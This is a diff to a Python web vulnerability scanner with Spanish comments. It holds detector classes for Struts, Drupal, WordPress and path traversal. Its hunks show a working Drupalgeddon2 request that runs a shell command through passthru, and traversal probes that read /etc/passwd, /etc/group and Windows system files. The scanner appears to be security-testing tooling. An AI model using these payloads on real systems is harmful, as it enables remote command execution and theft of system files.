@@ -43,7 +43,7 @@ class vulndetector(object):
 		# bandera para ejecucion individual (por cada recurso)
 		self.standalone = False
 		# Salida de la herramienta externa
-		self.output = None
+		#self.output = None
 		# Puntuacion del detector
 		self.puntuation = 0	
 		self.cmsroot = None
@@ -53,43 +53,11 @@ class vulndetector(object):
 	
 	# Busca por la carga del header h:key busca key
 	def fromHeaders(self,rheaders,direccion):
-		rhead,rhkeys = rheaders,rheaders.keys()
-		for lheader in self.headers:
-			for rhkey in rhkeys:
-				if lheader in rhead[rhkey]:
-					# aqui lo agrego a la lista
-					if self.color:
-						try:
-							print (Fore.GREEN+'Sw found (Header detection) >>>>>>>> '+Fore.RED+self.name+Style.RESET_ALL)
-						except:
-							print 'Sw found (Header detection) >>>>>>>> ',self.name
-					else:
-						print 'Sw found (Header detection) >>>>>>>> ',self.name
-					if direccion not in self.detections:
-						self.detections.append(direccion)
-						self.puntuation+=.1
-					return True
-		return False
-	
+		print 'vulndetection@fromHeaders'
+		
 	# Busca las cadenas (regexp) de wordpatterns en el codigo html
 	def fromCode(self,rcode,direccion):
-		for wp in self.wordpatterns:
-			matches = re.findall(wp,rcode,re.IGNORECASE) 
-			if len(matches) > 0:
-				if self.color:
-					try:
-						print (Fore.GREEN+'Sw found (Code detection) >>>>>>>> '+Fore.RED+self.name+Style.RESET_ALL)
-					except:
-						print 'Sw found (Code detection) -> ',self.name
-				else:
-					print 'Sw found (Code detection) -> ',self.name
-				for m in matches:
-					if m not in self.detections:
-						temp = direccion
-						self.detections.append(temp)
-						self.puntuation+=.1
-				return True
-		return False
+		print 'vulndetection@fromCode'
 	
 	# Detecta mediante la url (nombre del archivo)
 	def fromFilename(self,filename):
@@ -125,9 +93,11 @@ class vulndetector(object):
 	def launchExploitFilename(self,filename):
 		print 'exploit template'
 		
+	"""
 	def checkvulnerability(self,reqobj):
 		print 'vuln check template'
-		
+	"""
+	
 	def getPuntuation(self):
 		return self.puntuation
 		
@@ -135,19 +105,6 @@ class vulndetector(object):
 	def __str__(self):
 		return "\nName %s\nStandalone %s" % (self.name,self.standalone)
 
-	"""
-	# inicializa el diccionario con los directorios default del cms
-	# def initDicDefDirs(self): pass
-	# returns not default cms directories
-	# def postCrawling(self): pass				
-	# Regresa el resultado de la herramienta externa
-	# def getExternalResults(self): return None
-	def setToolPath(self,toolpath):pass
-	def setToolArgs(self,toolargs):pass
-	def setToolFlags(self,toolflags): pass
-	#def launchTool(self): pass
-	# def extToolScore(self): pass
-	"""
 	
 # done
 class strutscan(vulndetector):
@@ -173,7 +130,6 @@ class strutscan(vulndetector):
 		# Puntuacion de este scanner
 		self.puntuation = 0	
 		self.standalone = True
-		self.cmsroot = None
 
 	def launchExploitFilename(self,dirurl):
 		if self.launchExploitCVE_2013_2251(dirurl):
@@ -242,6 +198,7 @@ class drupalscan(vulndetector):
 		self.standalone = False
 		self.cmsroot = None
 
+	# Busca vulnerabilidades especificas, a partir de la raiz
 	def launchExploitsF(self):
 		#Aqui debo probar para cada recurso encontrado alguna vulne asociada
 		# resources to test on
@@ -272,9 +229,9 @@ class drupalscan(vulndetector):
 	def launchDrupalgeddon2(self):
 		if self.cmsroot is None: return False
 		cve = 'drupalgeddon2'
-		tocheck = 'truerandom'
+		tocheck = 'MTMzNw=='
 		dirurl = self.cmsroot
-		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'echo truerandom', 'name[#type]':'markup'}
+		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'echo base64_encode(1337)', 'name[#type]':'markup'}
 		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
 		# s es el objeto session de el objeto req
 		try:
@@ -343,7 +300,7 @@ class wordpresscan(vulndetector):
 				#print '*'*30,'\nVulnerable to %s\n' % cve,'*'*30
 				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
 				print response.text
-				self.detections.append("[ "+fullurl+" ] ====== Possible VULNERABLE TO: "+cve+" ===========" + response.text)
+				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" ===========" + response.text)
 				return True
 			return False
 		except Exception as e:
@@ -734,20 +691,14 @@ class path_traversal_scan(vulndetector):
 		self.detections = []
 		self.toolargs = []
 		self.resources = []
-		self.output = None
+		#self.output = None
 		# Puntuacion de este scanner
 		self.puntuation = 0	
 		self.standalone = True
 		self.cmsroot = None
 		# preffix file suffix
 		self.path_files = {'/etc/passwd':'root:x:0:0:root:/root:',
-			'/etc/passwd':'root:x:0:0:root:/root:',
-			'/etc/shadow':'root:$',
-			'/etc/bashrc':'# ~/.bashrc: executed by',
-			'/etc/cups/cupsd.conf':'# Configuration file for the CUPS scheduler',
 			'/etc/group':'root:x:0:',
-			'/etc/profile':'# /etc/profile: system-wide',
-			'/proc/cpuinfo':'processor	: 0',
 			'C:/Windows/system.ini':'; for 16-bit app support',
 			'C:/Windows/win.ini':'; for 16-bit app support'
 		}
@@ -757,6 +708,7 @@ class path_traversal_scan(vulndetector):
 			"%2e%2e%2f%2e%2e%2f"
 		]
 		self.suffixes = ['','%00']
+		self.already_tested = []
 		
 	def launchExploitFilename(self,dirurl):
 		if self.test_traversal(dirurl):
@@ -773,21 +725,27 @@ class path_traversal_scan(vulndetector):
 		injection_points = parseurls.get_injection_points(dirurl)
 		if injection_points is None: return 
 		for injection_point in injection_points:
-			for key in self.path_files:
-				# we find those strings that don't appear on orig_resp
-				if self.path_files[key].lower() not in orig_resp.text.lower():
-					for pfx in self.preffixes:
-						for sufx in self.suffixes:
-							new_url = injection_point.replace('{TO_REPLACE}',"%s" % ('%s%s%s'% (pfx,key,sufx)))
-							try: new_resp = self.req.getHTMLCode(new_url)
-							except Exception as e: pass
-							if (new_resp is not None and 
-								new_resp.text is not None and
-								self.path_files[key].lower() in new_resp.text.lower()
-							):
-								print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
-								toappend = "[ "+new_url+" ] ====== VULNERABLE TO: "+cve+" ====="
-								if toappend not in self.detections:
-									self.detections.append(toappend)
-									return True
+			if injection_point not in self.already_tested:
+				for key in self.path_files:
+					# we find those strings that don't appear on orig_resp
+					if self.path_files[key].lower() not in orig_resp.text.lower():
+						for pfx in self.preffixes:
+							for sufx in self.suffixes:
+								#print('[*] inj_ppt: %s' % injection_point)
+								new_url = injection_point.replace('{TO_REPLACE}',"%s" % ('%s%s%s'% (pfx,key,sufx)))
+								#print('[*] new_url: %s' % new_url)
+								try:
+									print('[i] testing path traversal: %s ' % new_url) 
+									new_resp = self.req.getHTMLCode(new_url)
+								except Exception as e: pass
+								if (new_resp is not None and 
+									new_resp.text is not None and
+									self.path_files[key].lower() in new_resp.text.lower()
+								):
+									print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
+									toappend = "[ "+new_url+" ] ====== VULNERABLE TO: "+cve+" ====="
+									if toappend not in self.detections:
+										self.detections.append(toappend)
+										return True
+				self.already_tested.append(injection_point)
 		return False
